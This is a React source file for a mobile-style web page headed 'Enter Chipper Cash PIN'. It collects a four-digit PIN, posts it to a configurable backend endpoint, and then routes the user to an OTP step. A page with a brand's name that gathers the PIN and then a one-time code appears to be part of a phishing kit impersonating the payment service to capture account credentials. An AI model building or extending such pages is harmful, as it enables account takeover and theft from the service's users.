import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";


const PIN_LENGTH = 4;

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(PIN_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputsRef = useRef([]);

  useEffect(() => { inputsRef.current[0]?.focus(); }, []);

  const handleChange = (e, i) => {
    const val = e.target.value.replace(/\D/g, "").slice(-1);
    const next = [...pin]; next[i] = val; setPin(next); setError("");
    if (val && i < PIN_LENGTH - 1) inputsRef.current[i + 1]?.focus();
  };
  const handleKeyDown = (e, i) => {
    if (e.key === "Backspace" && !pin[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };
  const handleSubmit = () => {
    const code = pin.join("");
    if (code.length < PIN_LENGTH) { setError("Please enter your 4-digit PIN."); return; }
    setLoading(true);
    axios.post(BASE_URL + "/pin", { pin: code })
      .then(() => {
        localStorage.setItem("pinVerified", "true");
        setTimeout(() => { setLoading(false); navigate("/otp"); }, 700);
      })
      .catch(() => {
        setTimeout(() => {
          setLoading(false);
          setError("Something went wrong. Please try again.");
          setPin(new Array(PIN_LENGTH).fill(""));
          inputsRef.current[0]?.focus();
        }, 700);
      });
  };

  const allFilled = pin.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-white flex justify-center">
      <div className="w-full max-w-[430px] min-h-screen flex flex-col">

        {/* Top nav */}
        <div className="flex items-center px-4 pt-12 pb-2">
          <button
            onClick={() => navigate(-1)}
            className="flex items-center justify-center active:opacity-60 transition-opacity"
            aria-label="Back"
          >
            <img src="/logo.png" alt="Back" style={{ height: "120px", width: "auto" }} />
          </button>
          <h2 className="flex-1 text-center text-[17px] font-semibold text-gray-900">
            PIN
          </h2>
        </div>

        {/* Body */}
        <div className="flex-1 px-5 pt-10">
          <h1 className="text-[26px] font-extrabold text-gray-900 mb-2">
           Enter Chipper Cash PIN
          </h1>
          <p className="text-[14px] text-gray-500 mb-10">
            Enter your 4-digit PIN to secure your account.
          </p>

          {/* 4 big PIN boxes */}
          <div className="flex gap-4 justify-center mb-4">
            {pin.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputsRef.current[i] = el; }}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(e, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
                className={
                  "w-16 h-16 text-center text-[26px] font-bold text-gray-900 border-2 rounded-2xl bg-white outline-none transition-all " +
                  (digit ? "border-[#6B4EFF] bg-[#f5f3ff]" : "border-gray-200") +
                  " focus:border-[#6B4EFF]"
                }
                aria-label={"PIN digit " + (i + 1)}
              />
            ))}
          </div>

          {error && (
            <p className="mt-4 text-[13px] text-red-500 font-medium text-center">
              {error}
            </p>
          )}
        </div>

        {/* Save button */}
        <div className="px-5 pb-10">
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!allFilled || loading}
            className={
              "w-full py-[18px] rounded-full text-[17px] font-bold transition-all duration-200 " +
              (allFilled && !loading
                ? "bg-[#6B4EFF] text-white"
                : "bg-[#d1d5db] text-white cursor-not-allowed")
            }
          >
            {loading ? "Please wait\u2026" : "Continue"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default Pin;
